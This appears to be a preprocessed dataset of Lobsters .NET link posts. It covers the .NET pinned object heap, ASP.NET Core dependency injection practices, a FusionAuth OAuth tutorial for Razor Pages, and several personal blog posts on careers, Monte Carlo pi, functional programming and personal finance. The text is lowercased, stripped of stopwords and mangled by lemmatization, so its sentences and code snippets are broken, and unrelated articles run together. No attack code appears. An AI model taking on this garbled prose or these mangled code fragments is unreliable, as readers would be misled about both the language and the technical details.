api provided first time since net instead using new operator able allocate array help two method gcallocatearray arraylength pinned true gcallocateuninitializedarray arraylength pinned true see new allocation api allows u specify want object pinned fact allows allocate directly poh instead sohloh question arises array microsoft say allowing allocate non array object certainly possible time see much value mostly scenario pinning really used pinning buffer various purpose buffer array word technically poh could contain object currently support array due provided allocation api read detailed design pinned object heap runtime documentation important remember allocation pinned object heap little slower regular soh allocation based perthreadbased allocation context synchronized free list gap like loh thus allocate poh appropriate free space must found one poh segment treat poh replacement longrunning gchandlebased allocation replacement rather shortliving fixedbased pinning yet another important limitation pinned object heap second design decision limit array type reference contain reference blittable type technical limitation decision derived typical pinning use case mostly pin buffer unmanaged data like primitive type int byte decision additional performance benefit gc may omit poh marking reachable object word outgoing reference need treat pohallocated object potential root corresponding check made runtime depends pinned flag public static allocatearray int length bool pinned false pinned runtimehelpersisreferenceorcontainsreferences throwhelperthrowinvalidtypewithpointersnotsupported typeof thus able compile code follows var x gcallocatearray string pinned true throw exception execution systemargumentexceptionmessage use type systemstring value type without pointer reference supported may wonder runtime check preferred unmanaged generic constrain using obviously would require create dedicated method pinning public static allocatepinnedarray int length unmanaged net team planning extend allocatearray additional parameter future like specifying generation want allocate least want limit providing specialized method also ongoing discussion whether add gcispinnedheapobject obj api checking given object allocated poh decided yet overhead checking probably overwhelm benefit typical scenario last word think various usage scenario array used help api typically still address fixed keyword may still necessary unsafe public static void main string args var pinnedarray gcallocatearray byte pinned true fixed byte ptr pinnedarray noop pinning influence gc compaction know fact kind noop influence object poh bad consequence gc summary see first usage showing like recently pr added kestrel ben adam knowing fact presented post next one write implementation arraypool based array allocated pinned object heap
51,Lobsters,dotnet,"C#, F#, .NET programming",AspNet Core Dependency Injection Best Practices & Tips (2019),"https://volosoft.com/blog/ASP.NET-Core-Dependency-Injection-Best-Practices,-Tips-Tricks",aspnet core dependency injection best practice tip,aspnet core dependency injection documentation basic constructor injection service construction good practice required dependency read property injection standard dependency injection container support property injection use public setter good practice optional dependency without null object pattern service locator iserviceprovider getrequiredservice getservice constructor good practice use implicit unit test mock constructor service method service life time three service lifetime transient scoped singleton dependency idisposable good practice transient multithreading memory leak scoped carefully singleton deal multithreading memory leak depend exception resolving service method body service scope iserviceprovider child service scope scopeserviceprovider using good practice child service scope iserviceprovider hold reference resolved service disposed service singleton service good practice threadsafe instance concurrentdictionary use scoped transient service memory leak end application releasedispose scoped service first seems service scope per web request child service scope good practice optimization share service scope different thread web request httpcontext httpcontextaccessor conclusion aspnet boilerplate,article share experience suggestion using dependency injection aspnet core application motivation behind principle effectively designing service dependency preventing multithreading issue preventing memoryleaks preventing potential bug article assumes already familiar dependency injection aspnet core basic level please read aspnet core dependency injection documentation first basic constructor injection constructor injection used declare obtain dependency service service construction example public class productservice private readonly iproductrepository productrepository public productservice iproductrepository productrepository productrepository productrepository public void delete int id productrepositorydelete id productservice injecting iproductrepository dependency constructor using inside delete method good practice define required dependency explicitly service constructor thus service constructed without dependency assign injected dependency read fieldproperty prevent accidentally assigning another value inside method property injection aspnet core standard dependency injection container support property injection use another container supporting property injection example using microsoftextensionslogging using microsoftextensionsloggingabstractions namespace myapp public class productservice public ilogger productservice logger get set private readonly iproductrepository productrepository public productservice iproductrepository productrepository productrepository productrepository logger nulllogger productservice instance public void delete int id productrepositorydelete id loggerloginformation deleted product id id productservice declaring logger property public setter dependency injection container set logger available registered di container good practice use property injection optional dependency mean service properly work without dependency provided use null object pattern like example possible otherwise always check null using dependency service locator service locator pattern another way obtaining dependency example public class productservice private readonly iproductrepository productrepository private readonly ilogger productservice logger public productservice iserviceprovider serviceprovider productrepository serviceprovider getrequiredservice iproductrepository logger serviceprovider getservice ilogger productservice nulllogger productservice instance public void delete int id productrepositorydelete id loggerloginformation deleted product id id productservice injecting iserviceprovider resolving dependency using getrequiredservice throw exception requested dependency registered hand getservice return null case resolve service inside constructor released service released care releasingdisposing service resolved inside constructor like constructor property injection good practice use service locator pattern wherever possible service type known development time make dependency implicit mean possible see dependency easily creating instance service especially important unit test may want mock dependency service resolve dependency service constructor possible resolving service method make application complicated error prone cover problem solution next section service life time three service lifetime aspnet core dependency injection transient service created every time injected requested scoped service created per scope web application every web request creates new separated service scope mean scoped service generally created per web request singleton service created per di container generally mean created one time per application used whole application life time di container keep track resolved service service released disposed lifetime end service dependency also automatically released disposed service implement idisposable interface dispose method automatically called service release good practice register service transient wherever possible simple design transient service generally care multithreading memory leak know service short life use scoped service lifetime carefully since tricky create child service scope use service nonweb application use singleton lifetime carefully since need deal multithreading potential memory leak problem depend transient scoped service singleton service transient service becomes singleton instance singleton service injects may cause problem transient service designed support scenario aspnet core default di container already throw exception case resolving service method body case may need resolve another service method service case ensure release service usage best way ensuring create service scope example public class pricecalculator private readonly iserviceprovider serviceprovider public pricecalculator iserviceprovider serviceprovider serviceprovider serviceprovider public float calculate product product int count type taxstrategyservicetype using var scope serviceprovidercreatescope var taxstrategy itaxstrategy scopeserviceprovider getrequiredservice taxstrategyservicetype var price productprice count return price taxstrategycalculatetax price pricecalculator injects iserviceprovider constructor assigns field pricecalculator us inside calculate method create child service scope us scopeserviceprovider resolve service instead injected serviceprovider instance thus service resolved scope automatically releaseddisposed end using statement good practice resolving service method body always create child service scope ensure resolved service properly released method get iserviceprovider argument directly resolve service without care releasingdisposing creatingmanaging service scope responsibility code calling method following principle make code cleaner hold reference resolved service otherwise may cause memory leak access disposed service use object reference later unless resolved service singleton singleton service singleton service generally designed keep application state cache good example application state example public class fileservice private readonly concurrentdictionary string byte cache public fileservice cache new concurrentdictionary string byte public byte getfilecontent string filepath return cachegetoradd filepath return filereadallbytes filepath fileservice simply cache file content reduce disk read service registered singleton otherwise caching work expected good practice service hold state access state threadsafe manner request concurrently us instance service used concurrentdictionary instead dictionary ensure thread safety use scoped transient service singleton service transient service might designed thread safe use take care multithreading using service use lock instance memory leak generally caused singleton service releaseddisposed end application instantiate class inject releasedispose also stay memory end application ensure releasedispose right time see resolving service method body section cache data file content example create mechanism updateinvalidate cached data original data source change cached file change disk example scoped service scoped lifetime first seems good candidate store per web request data aspnet core creates service scope per web request register service scoped shared web request example public class requestitemsservice private readonly dictionary string object item public requestitemsservice item new dictionary string object public void set string name object value item name value public object get string name return item name register requestitemsservice scoped inject two different service get item added another service share requestitemsservice instance expect scoped service fact may always like create child service scope resolve requestitemsservice child scope get new instance requestitemsservice work expect scoped service always mean instance per web request may think make obvious mistake resolving scoped inside child scope mistake regular usage case may simple big dependency graph service know anybody created child scope resolved service injects another finally injects scoped service good practice scoped service thought optimization injected many service web request thus service use single instance service web request scoped service need designed threadsafe normally used single webrequestthread case share service scope different thread careful design scoped service share data service web request explained store per web request data inside httpcontext inject ihttpcontextaccessor access safer way httpcontext lifetime scoped actually registered di inject inject ihttpcontextaccessor instead httpcontextaccessor implementation us asynclocal share httpcontext web request conclusion dependency injection seems simple use first potential multithreading memory leak problem follow strict principle shared good principle based experience development aspnet boilerplate framework
52,Lobsters,dotnet,"C#, F#, .NET programming",Securing an ASP.NET Core Razor Pages app with OAuth,https://fusionauth.io/blog/2020/05/06/securing-asp-netcore-razor-pages-app-with-oauth,securing aspnet core razor page app oauth,build command line tool configuring fusionauth creating user fusionauth net core cli client supported algorithm symmetric algorithm supported different key type set basic aspnet razor page application razor page full source code multiple way deploying application branch login command line tool identitymodel authorize filter attribute openidconnectoptions openidconnectoptions oauth error oauth flow theme login screen fusionauth branch logout branch next step fusionauth net core client library,previously used net core build command line tool add user fusionauth user identity management system tutorial build web application protected page use razor page login logout happen fusionauth using authorization code grant configuring fusionauth already fusionauth running head previous post creating user fusionauth net core cli client instruction downloading installing fusionauth also need create application want skip building cli client create user admin user interface going make change fusionauth configuration allow integration aspnet core web application first going create new signing key list supported algorithm work open source identity project using currently symmetric algorithm love honesty library maintainer use symmetric key easy answer using default hmac key resulted securitytokensignaturekeynotfoundexception easy way change signatureprovider luckily fusionauth support different key type let generate asymmetric key use sign json web token jwts generate key go setting key master upper right hand corner click dropdown next import public key choose generate rsa use descriptive name like dotnetcore leave rest default click submit next modifying previously created dotnetcore application setting edit application go oauth tab make following change add authorized redirect url http add logout url http web application going build going port signinoidc endpoint provided authentication library setting thing authorization code grant work write client id client secret need information later done configuring section oauth tab application look like next go jwt tab need enable json web token signing tell fusionauth use previously generated rsa keypair update access token signing key id token signing key point keypair done jwt tab look like click blue save icon save setting configured done fusionauth unless need add user case go user section add one make sure add dotnetcore application creating appropriate user registration set basic aspnet razor page application let start building aspnet core web application use razor page aspnet core application display common information user also secured area available authenticated user good thing already added one usual full source code available want download take look first let create new web application using dotnet cli go directory dotnet new webapp sampleapp cd sampleapp see result publish application run multiple way deploying application chose publishing ensure deployment process repeatable tutorial building standalone window executable codebase also build macos linux program command publish standalone executable could deploy behind proxy like nginx dotnet publish r start executable hit controlc exit application also like open separate terminal edit source file applicable using visual studio another editor also like combine publish start command one line run bash shell dotnet publish r visit http redirected http address get warning browser might make sense production unless terminated tl traffic get application need behavior development avoid simply remove appusehttpsredirection startupcs main configuration file web application also want add page secured aptly call secure add securecshtml securecshtmlcs sampleapppages directory give following content securehtml look like page model securemodel viewdata title full secure data viewdata title p tbd p securehtmlcs contain code using system using systemcollectionsgeneric using systemlinq using systemthreadingtasks using microsoftaspnetcoremvc using microsoftaspnetcoremvcrazorpages using microsoftextensionslogging namespace sampleapppages public class securemodel pagemodel private readonly ilogger securemodel logger public securemodel ilogger securemodel logger logger logger public void onget forget add navigation element pagessharedlayoutcshtml privacy li class navitem class navlink textdark asparea asppage secure secure li hit controlc exit application republish start visit http view new page click secure looking github repository see application point looking setupapplication branch added page sure secure yet let next login always smart leverage existing library likely secure better handle edge case going add two new library application make sure sampleapp directory run command add dotnet add package microsoftaspnetcoreauthenticationopenidconnect dotnet add package identitymodelaspnetcore v note unlike command line tool using fusionauth client package protecting page using standard oauth need fusionauth specific api call highlighting fusionauth could run code compliant server specify version identitymodel package released yet package make integrating standardsbased oauth server snap overlook quite released need protect secure page using authorize filter attribute backing class securecshtmlcs namespace sampleapppages authorize public class securemodel pagemodel could also added razorpagesoptions startupcs file specifying page protected authorization call would good choice wanted everything centralized depending need size application one choice might better servicesaddrazorpages addrazorpagesoptions option optionsconventionsauthorizepage secure also display claim contained jwt fusionauth creates upon authentication securecshtml iterates claim update file include text including claim claim essentially information authentication server shared subject jwt page using microsoftaspnetcoreauthentication model securemodel viewdata title full secure data viewdata title claim dl foreach var claim userclaims dt claimtype dt dd claimvalue dd dl also need set service specify page protected full startupcs code using system using systemcollectionsgeneric using systemlinq using systemthreadingtasks using microsoftaspnetcorebuilder using microsoftaspnetcorehosting using microsoftaspnetcorehttpspolicy using microsoftextensionsconfiguration using microsoftextensionshosting using microsoftaspnetcoreauthentication using microsoftextensionsdependencyinjection using microsoftidentitymodeltokens using systemidentitymodeltokensjwt using microsoftidentitymodellogging namespace sampleapp public class startup public startup iconfiguration configuration configuration configuration public iconfiguration configuration get method get called runtime use method add service container public void configureservices iservicecollection service jwtsecuritytokenhandlerdefaultmapinboundclaims false servicesaddrazorpages servicesaddauthentication option optionsdefaultscheme cookie optionsdefaultchallengescheme oidc addcookie cookie option optionscookiename mycookie optionseventsonsigningout async e await ehttpcontextrevokeuserrefreshtokenasync addopenidconnect oidc option optionsauthority configuration sampleapp authority optionsclientid configuration sampleapp clientid optionsclientsecret configuration sampleapp clientsecret optionsresponsetype code optionsrequirehttpsmetadata false method get called runtime use method configure http request pipeline public void configure iapplicationbuilder app iwebhostenvironment env envisdevelopment appusedeveloperexceptionpage else appuseexceptionhandler error default hsts value day may want change production scenario see http akamsaspnetcorehsts appusehsts appusestaticfiles appuserouting appuseauthentication appuseauthorization appuseendpoints endpoint endpointsmaprazorpages identitymodeleventsourceshowpii true let go interesting part first setting authentication including scheme challenge method using cooky store authentication information oidc authentication provider defined servicesaddauthentication option optionsdefaultscheme cookie optionsdefaultchallengescheme oidc configure cookie including setting cookie name addcookie cookie option optionscookiename mycookie finally set previously referenced authentication provider oidc could multiple provider create openidconnectoptions object fully configure provider setting responsetype code force use authorization code grant pkce turned default pull configuration information like client id either appsettingsjson environment value saved configuring fusionauth add appsettingsjson bit later create openidconnectoptions object configure provider since want use authorization code grant set responsetype code pkce turned default ready oauth addopenidconnect oidc option optionsauthority configuration sampleapp authority optionsclientid configuration sampleapp clientid optionsclientsecret configuration sampleapp clientsecret optionsresponsetype code optionsrequirehttpsmetadata false also need turn authentication application appuseauthentication wait thought preventing user accessing certain page authorization authentication first set application authentication scheme configured case actually prohibiting access anonymous user authenticated user authorized debugging add identitymodeleventsourceshowpii true end configure method make easier see error oauth flow production code please remove identitymodeleventsourceshowpii true promised appsettingsjson file need add entire sampleapp object code configured correctly authority location user identity server case fusionauth logging loglevel default information microsoft warning microsofthostinglifetime information allowedhosts sampleapp authority http clientid wait client secret file git put secret version control instead client secret provided command line via environment variable change mean correct way publish start web application replace client secret value dotnet publish r updated file publish start application able log previously created user see claim go http click secure page prompted log using fusionauth default login page theme login screen fusionauth want make login page look like company brand signed end secure page see claim encoded jwt see source application stage development looking addauthentication branch logout awesome log valid user credential however right way log jwt stored session cookie ready leave want log aspnet core session fusionauth session need add logout page remove session cookie redirect fusionauth oauth logout endpoint fusionauth destroy session redirect back configured logout url add logout page logoutcshtmlcs class look like namespace sampleapppages public class logoutmodel pagemodel private readonly ilogger logoutmodel logger private readonly iconfiguration configuration public logoutmodel ilogger logoutmodel logger iconfiguration configuration logger logger configuration configuration public iactionresult onget signout cookie oidc var host configuration sampleapp authority var cookiename configuration sampleapp cookiename var clientid configuration sampleapp clientid var url host clientid clientid responsecookiesdelete cookiename return redirect url onget important method sign using method authentication library delete jwt cookie send user fusionauth oauth logout endpoint forget add logout page navigation user signed useridentityisauthenticated li class navitem class navlink textdark asparea asppage logout logout li also need update appsettingsjson file cookie name setting since referencing cookie two place pulling appsettingsjson file make maintainable application sampleapp authority http cookiename mycookie clientid finally need change startupcs file use new cookie name addcookie cookie option optionscookiename configuration sampleapp cookiename great sign sign application interested see application current code looking addlogout branch next step want explore add page application limit page certain user customize fusionauth login page theme could also welcome user first name retrieving user information via api call using fusionauth net core client library next post net core series associating user role creating custom claim jwt stay tuned
53,Lobsters,dotnet,"C#, F#, .NET programming",Enterprise C# to Self Employed React and Blazor - followup,https://www.towardssoftware.com/blog#blog30,enterprise c self employed react blazor followup,rich hickey talk gmailcom elamje favorite thread hn undergrad studying computer engineering gmailcom gmailcom space jump code short youtube video gmailcom gmailcom http wwwtowardssoftwarecomblog gmailcom see work see pro con list read gmailcom http wwwtowardssoftwarecomblog policyschemehandler http wwwtowardssoftwarecomblog middleware life box product,start select start data description system trying grok look data come nt data system think data need go simple select x save coworkers lot time energy getting started etl project couple architect designing past week lacking documentation schema database still fleshed however bit test data db piece responsible want understand kind database model working without description schema column represents need help understand almost reached one stafflevel engineer get insight realized probably look underlying mock data understand relationship reminded journey junior senior engineer junior need told something work senior use code doc data understanding old day nt look data overwhelmed number table name column name never bothered look inside table select could saved huge amount time sitting going entire database select although etl project nt using clojure constantly reminded superpower embedded lisp etl supporting dsl written top staticallytyped compiled language want understand power clojure lisp really work two domain using typed compiled language lot reflection lot waiting compiler also reminded rich hickey talk essence data enterprise dev self employed month followup wow original post got view opened many new connection got respond everybody wrote email encourage well month since wrote experienced couple month react contracting lot c net blazor work success even though sell car make first couple month happen result job landed outbound inbound data posted hn freelancer thread october november reached people could helped turned gig really sketchy person insisted everything nda could pay crypto avoided going path lastly got inbound gig turned full time job nt aiming could nt pas breaking got first gig reaching someone seeking intermediate android developer scheduled call chatted happened lot common ended letting work another project instead nt advertised ended react second gig really take home job interview project got paid build pretty basic crud app show knew importantly reason even got interview twitter twitter many month decided wanted get really good net blazor new single page app paradigm put net blazor expert twitter bio aspirational public goal itention anyone hiring based data point happened bos looking blazor person totally forthcoming actual level blazor skill talked said needed blazor biggest takeaway following generating lead far simple nt happen like anticipate gig totally indirect opportunity say helped twitter blog tied directly name hacker news profile actual job net blazor expert since early january year honest pace team work could easily top percentage blazor server developer work rapidly make new thing rewrite mean cranked many new feature week since january count something however still long way go net ecosystem coworkers literally amount experience net truly expert platform anyways happy take full time job purely fact coworkers expert icing cake use cutting edge technology work mvp build product spare time oh pay better bigcorp job remote reason intentionally ignorant selection bias luck recommend others follow suit leave bigcorp america sweet opportunity willing give safety might better luck others might take bit longer find opportunity course always try get consulting going evening job minimize risk sad part story able work clojure yet still holding onto hope maybe even convince bos use product fire emacs toy last thing want say nt invested much energy twitter trying grow take aspirational title net blazor expert part online journey opportunity going documenting learned tip occasionally tweet investing stocksderivatives sweden well question want say hey feel free email gmailcom dm elamje c missed rocket ship sparked curiousity sql server language extension support java think data engineering c missed big data rocket ship orgs use c data workload course could become defacto standard big data le restrictive platform specific early day explosive data growth think mistake similar order magnitude missing smartphones doubt microsoft resource early create something akin net core whatever reason missed mark cross platform usage meant company like google twitter etc could use net c linux server struggled get kind adoption orgs operate scale instead java jvm became king big data year hacker news might wondering matter link aggregator year well people probably nt however led inner revival contract work learning clojure meeting people understanding leverage awesome new job thanks hn following thank bit unstructured hope might resonate nt want read check favorite thread hn awoken geek first thing hn unlocked inner nerd died day believed way get wealthy finance medicine law much loved engineering course high school college point began think way successful engaged field engineering executive found hacker news delightfully flooded wave people obsessed learning entrepreneurship generally thoughtprovoking stuff many thread comment incredibly nuanced occasional software startup celebrity appearance contrast friend interest online people found large made discovery hn much better learned like large group people gathered based solely interest make money second thing hn unlocked wonderful short term career prospect found people u world working technology choice making non trivial sum money consulting work mention huge corpus startup startup employee hn understand news need context give quick background undergrad studying computer engineering torn pursue career software machine learning hardware design long story short got job working large company working large enterprise c app hard understand got head around web app principle quickly realized going spend several year understand app domain fully even senior enough position guide architecture took job nt understand web software career path possible software wanted fast career growth fast skill acquisition time realized began seeing startup contracting viable alternative realization manifested seriously reconsidering current career trajectory clojure little code much power third thing hn unlocked joy writing software lisp clojure specifically showed nt need write line java class basic text parsing wonderful departure boring project assigned college realized language without boilerplate realized incredible amount opensource language exist realized dynamic terse language like clojure superpower important thing business project minimize boilerplate really use language get way pleasure use lest project get buried github graveyard realizing pg hype lisp rightfully placed wonderful feeling learning clojure enlightening thing ever done software career class code manipulated easily data rick hickey transformative coming c c java background realized like enjoy writing code importantly sparked motivation creativity project would never set leverage key fourth thing hn unlocked assurance perfect field nt know maybe buying vc backed b hype train promise fun career high financial reward real example software people solving problem typically web little bit code marketing real large economic impact back hardware design intern college nt see legitimate way inside engineering world luckily hn many example false code one easiest powerful form leverage u software people disposal nt understand first started big corp job quickly became clear successful internet company startup one thing write code point econ software clicked obvious industry access global low cost distribution network internet cheap army robot willing whatever code make possible monopoly like profit margin without monopoly clicked simply could nt content salary job equity slow career growth little creative freedom lead job searching startup land building mvp also moving contract work understanding leverage led alter path better utilize software capture value never would got working enterprise developer new job last thing hn unlocked thus far contract work job always looking opportunity get better software man great get paid get better remember said nt content big corp job well turn reason boldness leave without anything else lined read lot comment post hners took plunge wow exactly needed earlier mentioned wanting fast career growth fast skill acquisition taking two month build mvp new language great contract work new technology top lucky enough toptier c consulting shop reach opportunity starting tomorrow thing direct result engaged hn thanks hacker news want say hey email gmailcom consider good writer tip please email gmailcom monte πthon monte carlo π line python nt normally talk math thought magical share like heard monte carlo simulation wondered nt use enough give definition share intuitive example use start saying computer engineer primarily web apps although interested space however engineer developer math genius certainly required continue aim show simple way understand internalize basic monte carlo method going calculate π jump code develop intuition first essentially randomly drop many point square known area count many point also lie inside circle use ratio point circle total point information calculate π let look equation need border circle made xy point satisfy r desired radius area circle π arbitrarily pick r given xy point find point inside circle checking radius random xy point figure see point circle point total ratio represents point circle point square multiply ratio area square get area circle case recall square area area circle equal ratio since area circle π rearrange π area circle case π area circle point two unknown π area circle solve π need estimate area circle recall calculated boom like method solve π picture π get accurate let write code computer step u run code see output get closer closer π true value increase number point see solved two unknown estimating one area circle random data random data got larger estimation got accurate estimation π came closer truth think quite magical press green play button run code explained line import library generate random xy point line initialize count point circle line generate random point square line point circle add count line calculate ratio point circle total point line π circlearea divided radius squared also think magical highly recommend short youtube video completely unrelated way π occurs naturally understand π appears mandelbrot set please email gmailcom use monte carlo simulation regularly would love hear use complex problem reach π email say hey gmailcom submit http wwwtowardssoftwarecomblog consulting software engineer living boulder co primarily working clojure python net react mainly interested helping people make stupid simple software ideally scratch early startup new project also work mature small medium sized nontech firm make custom software available clojure python react data engineering project moment gmailcom previously worked pwc prepreviously studied computer engineering university texas since leaving corporate work making better software time create several project linked future also run pearl business highly interested high speed rail hyperloop generally fast transport additionally snowboarding hiking passion working anything cool space love help see work see migrating enterprise c self employed clojure react past month somewhat enlightened new kind work exists software engineer going try paint picture transition well explain could worth skip pro con list read background currently month exploratory hiatus corporate life enjoying massively month ago fresh grad ut austin extremely enthused start career software engineering gotten job pwc somewhat clueless software development could career quickly learned c daily language enterprise heavily used microsoft stack quickly felt stagnation challenge learning nt thing easy reason first year gate mostly incredibly boring html cs c copypaste style coding due incredibly mature application think million line code hard grasp domain knowledge caked somewhere time organically stumbled upon paul graham essay eventually hacker news orange site profoundly changed way saw career trajectory likely could like many older developer around stay year end making year cheap major city possibly make partner double triple life short wait year abstract possibility began absorbing content possibly could hacker news three key element presented browsing startup importance ownership fun programming startup saw wonderful ability deal typical corporate b loved pwc really nt care watch hour accounting ethic video annually ownership saw really equity anything software related way build wealth grows nonlinearly time input thanks naval ravikant fun programming found clojure realized increase joy programming decrease boilerplate code magnitude simply using rather java c mention magic lisp course many people nt get wealthy quickly startup coding realized thing life take time patience mind impatience corporate programming growth knew needed something would challenging provide greenfield project architectural decision nt sense thing would happen quickly job spent night year learning clojure rust making python web app towards end year decided really needed jump deep end spend time trying make something scratch figuring could earn money biggest fear would nt healthcare would watch saving account deplete thing likely true ultimately decided worth set without clear shortterm plan make money vague idea wanted sell pearl jewelry consult software thanks make saas mvp read middle three thing starting feel normal working contract work got hacker news making pearl jewelry eventually want become importer basically done saas mvp certainly dynamic work might find hard explain thanksgiving christmas sure next step grateful pwc providing small cushion time hacker news people catalyzing realization higher ambition put much thought paragraph portray want list reason work style may may suit essentially unlimited schedule flexibility meaning best hour day nt given employer tradeoff must remain disciplined high earning potential starting business consulting software developer tradeoff steady income benefit potential work fast paced dynamic project using tech interesting tradeoff also might work long period time potential work hour week making every penny contractor tradeoff longer guaranteed least hour work potential work le tradeoff likely wo nt earn ability work hour straight mental flow without slack email ping tradeoff may feel isolated time meet friend family point day tradeoff friend family might respect working hour like wish get paid overtime deadline push tradeoff longer get paid take holiday vacation pay scaled please without waiting annual review tradeoff might get work new rate pay limited wider contract market rate lucky niche expertise competitive market rate tradeoff justify selfemployed consultant slot resume future employer worry hiding unemployed period list certainly exhaustive thing crossed mind considering selfemployment good next step ambitious engineer feel inhibited corporate grind must determine power change workplace want need hit eject button interested detail want chat say hey gmailcom submit use http wwwtowardssoftwarecomblog functional programming better function operate one data structure function operate data structure alan perlis sicp foreword eternal debate around object oriented software v functional software likely never conclusion however choose functional possible api problem defined every abstraction service create software consumer spend time learning api familiar concept domainspecific language dsl start understand trouble nice api introduces new pattern follow importantly introduces new pattern learn first heard term dsl learning clojure lisp give magical ability google homoiconic create new language extremely rapidly create new language make dsl powerful something new outsider learn reading modifying code modern web developer know apis well typically apis used gain massive leverage scalability without write much code maintain complex service anyone used powerful apis know great working time spent looking documentation suck time lucky might get first try likely keep searching doc blog stack overflow find essence looking trouble frustration come assumed service going plug play easy set spent two hour learning dsl nt really care learn nt want learn api specific pattern shape json language object oriented programmer spend year making complex apis let explain object api oop nt call api effectively object use object get contract say call get set tostring foo bar etc object api layer access functionsmethods api access data deny functional programming data api also explain better back object let look class net core policyschemehandler actual class nt matter purpose interested authentication related stuff nt already please open link tell method sound useful may gotten sidetracked long method name description nt actually say method rather inherits sweet hyperlink follow figure use class api going spend least minute learning lot take almost minute read class declaration public class policyschemehandler microsoftaspnetcoreauthenticationsigninauthenticationhandler mouth full argue one class hundred application might need interface full method class introduce create project brings many many method specific class alone maybe made nice interface required implement sleep method human dog cat class likely typed similar method one functional programming help spoiled clojure opinion somewhat colored experience clojure use map seqs vector list primitive data structure class previously u something wonderful make function accept aforementioned data structure parameter return correct answer need implement sleep time time nasty app get paid work implement magic pas map shape represent human dog cat function treat would rather sleep function different animal type different animal class sleep method cherrypicked example norm gain massive leverage treating data data instead treating like object rigid force burden implementation detail submit use http wwwtowardssoftwarecomblog perfect web framework essence web framework one thing transform text based request state complexity arise nt web framework accomplishing goal let dream world simple web page build web framework might guessed world simple webpage literally text notice tutorial framework make sure configuration correct displaying hello webpage authentication file uploads post request single get request show string note remainder post clojure implementation language detail idea framework simple ported language hour regarding clojure choose web server get started however also detail code shared portable across server point framework nothing let think simplest abstraction web framework remember need transform text based request maybe state need structure composable linearly independent unit added together flexible order independent interoperable efficient fast minimize blocking time async unit commonly referred middleware let use unit work naturally composable function since function take argument keep simplicity mind accept one argument request concrete way move forward function unit work accomplish via transformation request define function respondhello single parameter req function anything request simply return ok status text body hello function make well request need determine request going routing type request get post request need persist data form make structure function maintain maximum flexibility ideally request piped though many function finally turned response returned requester functionality needed request routing functionality needed certain request like authentication would nice one central location common middleware transform request le common middleware defined locally route view continued todos keep simple transformation request copypaste framework deps cross language building saas month ago decided quit job pwc make time capsule internet bigger thing idea sprouted reflected nt picture dad year passed still nt understand nowadays people pas away lose digital belonging unless meticulous people facebook account stay linkedin profile still around dropbox special photo limbo make incredibly sad reflect dad life digital self still around ca nt access ca nt access incredible moment care many people want photo unified way accomplished every online service procedure fragmentation one digital life becomes hard family tie together death time capsule play role well directly nt short term need attractive feature people healthy nudged make better end life plan time capsule nothing new appeal essence opposite snapchat document photo access appear period time rather disappear hope people attracted novelty setting time capsule deliver grandchild year future serve entry point service modern estate planning gave inspiration start making life box name likely change solution problem near dear also extremely personal everyone death fun will fun nothing deal fun still much friction thing happens everyone problem willing tackle nt know anyone else try funeral expensive funeral home trying upsell wreck data go die honestly know tech person nt even know happens online service use life box infancy nt lot capability help question roadmap clear fruit hanging low doubt people use something make process little bearable life box enticing people come time capsule hoping stay fullservice estate planning digital archival tool economics google alternatively could titled google kill many product claim economist even insider google number referenced keep magnitude mind based published data inspired many scathing comment hacker news company practice killing product thought first consider common engineering method software engineer commonly make prototype get feedback either user metric iterate software development wonderful process releasing world easy cheap development main expense product developer company one seek lower cost raise revenue otherwise known widening profit margin software typically look like lowering development cost acquiring user said software issue lot software somewhat fixed cost development whether software used development cost brings u back google simply put economics software work favor user niche software made large organization google scaling million user nt expense getting product ground adding feature fixing bug google developer tied product user nt growing however dedicated user google profit maximizing entity must immediately recognize wasted resource many product launch try reach holygrail hockey stick user growth remember google nt make ton money per user product hitting jackpot lottery necessary widen margin high fixed development cost tiny marginal distribution cost must absolutely scale million user rapidly wallow low roi land wait nt many google loved product free yes forgotten real economics google need data data scientist analyst would tell nt need data need many people data possible statistic significance google need monetize million user time product nt reach scale data nt valuable since aggregate ca nt treated significant google anyways furthermore issue useful said data nt apply large portion google user somehow data need turned advertising value nt million user data product le value proposition advertiser seeking specific target software people appreciate iteration google case lot time iteration mean time scrap product key google data company message app xyz company key value proposition ton data particular product free lagging data creation department go google iterating product find data cash cow monetize indirectly company iterating product generate money directly u nt used many saas product use bread butter company make would never drop flagship product unfortunately google flagship product data product left greive result using product data company rather using product product company personal finance favorite favorite apps website software finance personal banking charles schwab weird choice right well travel internationally frequency prolonged amount time hand best option writing best feature unlimited free atm withdrawal atm internationally decent account interest rate large bank good mobile app fee period downside physical location limited interbank transfer mobile check deposit le appealing interest yield smaller bank easier think go internet banking schwab nice secondary bank account elsewhere able deposit cash bank transfer schwab back international banking wonderful avoid service fee overdraft fee atm fee international charge fee furthermore make transaction internationally exchange rate extremely good like basically pas visa exchange rate directly markup physical presense important next best option mobile deposit work extremely well allow add external account let see bank account balance make free transfer two investingbrokerage robinhood charles schwab recommend robinhood clean simple free schwab established lot offer outside stock market robinhood great great fun money like check price large portfolio would argue app almost make instinctively short term investor bright red color make sell bad day additionally interesting deal set high frequency trading firm like citadel virtu make think getting pretty bad price ca nt prove big player offering free trading make payment order flow brokerage probably mean anything trade thousand dollar otherwise bad price probably still better dropping traditional brokerage charles schwab cool cash sweep take uninvested cash give small return robinhood take return offer bond option strategy cd money market well foreign stock schwab modest trading fee people capital thousand dollar fee eat nonnegligible amount return savingsenveloperetirement acorn acorn app pretty simply small fee two product like acorn core acorn later core account get funded onetime transfer recurring transfer round ups round ups simply track card purchase round next dollar transferring difference acorn account work really well people use card lot give way favor later saving investing swipe later account take onetime transfer recurring transfer allows select would like traditional roth ira invest important distinguishing feature core investment option streamlined option based risk exposure look app see exactly percentage go index fund investment type able give relatively easy way invest index fund still choice paralyzed number fund available later hand category automatically put category based age younger age put aggressive setting mostly stock older age put conservative setting bond budgeting need budget aka ynab unlike app long name app concise simple use enjoyed using past day month struggling intuit mint key difference mint free advertisement ynab month ynab however much simpler ui even conceptually simpler instead tracking trying selflimit expense give every dollar job like enveloping one category run money must pull fund another category use going forward help regulate never overspend overall budget regardless subcategory staying budget ynab import transaction directly bank allows manually add would prefer ultimately mint ynab differ pricing ui budget style squeezing saving month trying mint would worth otherwise think ynab better budgeting stylesolution
